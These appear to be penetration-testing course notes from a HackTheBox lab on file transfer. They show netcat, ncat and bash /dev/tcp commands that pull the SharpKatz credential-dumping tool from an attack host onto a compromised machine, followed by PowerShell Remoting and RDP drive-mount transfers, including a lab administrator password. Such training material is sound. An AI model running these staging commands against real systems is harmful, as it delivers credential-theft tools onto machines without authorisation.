## Netcat

[Netcat](https://sectools.org/tool/netcat/) (often abbreviated to `nc`) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations.

**Note:** **Ncat** is used in HackTheBox's PwnBox as nc, ncat, and netcat.

## File Transfer with Netcat and Ncat

The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target. Let's create an example and transfer a tool to our target.

We'll first start Netcat (`nc`) on the compromised machine, listening with option `-l`, selecting the port to listen with the option `-p 8000`, and redirect the [stdout](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_\(stdin\)) using a single greater-than `>` followed by the filename, `SharpKatz.exe`. In this example, we'll transfer [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) from our Pwnbox onto the compromised machine

#### NetCat - Compromised Machine - Listening on Port 8000
```
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```
If the compromised machine is using Ncat, we'll need to specify --recv-only to close the connection once the file transfer is finished.

#### Ncat - Compromised Machine - Listening on Port 8000

`victim@target:~$ # Example using Ncat 
`victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe`

From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat. The option `-q 0` will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.
#### Netcat - Attack Host - Sending File to Compromised machine
```
tylapcheong@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
tylapcheong@htb[/htb]$ # Example using Original Netcat
tylapcheong@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

#### Ncat - Attack Host - Sending File to Compromised machine
By utilizing Ncat on our attacking host, we can opt for `--send-only` rather than `-q`. The `--send-only` flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with `--send-only`, there is no need to anticipate further incoming information.
```
tylapcheong@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
tylapcheong@htb[/htb]$ # Example using Ncat
tylapcheong@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
#### Attack Host - Sending File as Input to Netcat
`tylapcheong@htb[/htb]$ # Example using Original Netcat tylapcheong@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe`

#### Compromised Machine Connect to Netcat to Receive the File
`victim@target:~$ # Example using Original Netcat victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe`


Let's do the same with Ncat:
#### Attack Host - Sending File as Input to Ncat
`tylapcheong@htb[/htb]$ # Example using Ncat tylapcheong@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe`

#### Compromised Machine Connect to Ncat to Receive the File
`victim@target:~$ # Example using Ncat victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe`

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).

Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.

#### NetCat - Sending File as Input to Netcat
`tylapcheong@htb[/htb]$ # Example using Original Netcat tylapcheong@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe`

#### Ncat - Sending File as Input to Ncat
`tylapcheong@htb[/htb]$ # Example using Ncat tylapcheong@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe`

#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File
`victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe`

## PowerShell Session File Transfer

We already talked about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), aka WinRM, to perform file transfer operations.

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to execute scripts or commands on a remote computer using PowerShell sessions.

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file from `DC01` to `DATABASE01` and vice versa.

#### From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.
```
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

```
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

Because this session already has privileges over `DATABASE01`, we don't need to specify credentials. In the example below, a session is created to the remote computer named `DATABASE01` and stores the results in the variable named `$Session`.

#### Create a PowerShell Remoting Session to DATABASE01
`PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01`

We can use the `Copy-Item` cmdlet to copy a file from our local machine `DC01` to the `DATABASE01` session we have `$Session` or vice versa.
#### Copy samplefile.txt from our Localhost to the DATABASE01 Session
`PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\`

#### Copy DATABASE.txt from DATABASE01 Session to our Localhost
`PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session`

## RDP

RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access. 

If we are connected from Linux, we can use `xfreerdp` or `rdesktop`. At the time of writing, `xfreerdp` and `rdesktop` allow copy from our target machine to the RDP session, but there may 
be scenarios where this may not work as expected. 

As an alternative to copy and paste, we can mount a local resource on the target RDP server. `rdesktop` or `xfreerdp` can be used to expose a local folder in the remote RDP session.

#### Mounting a Linux Folder Using rdesktop
`tylapcheong@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'`

Note: Make sure the directory in source linux directory exist. In this example, /rdesktop/files.

#### Mounting a Linux Folder Using xfreerdp
`tylapcheong@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer`

To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session. 

Enable specific drives under Local devices and resources settings in Remote Desktop Connection.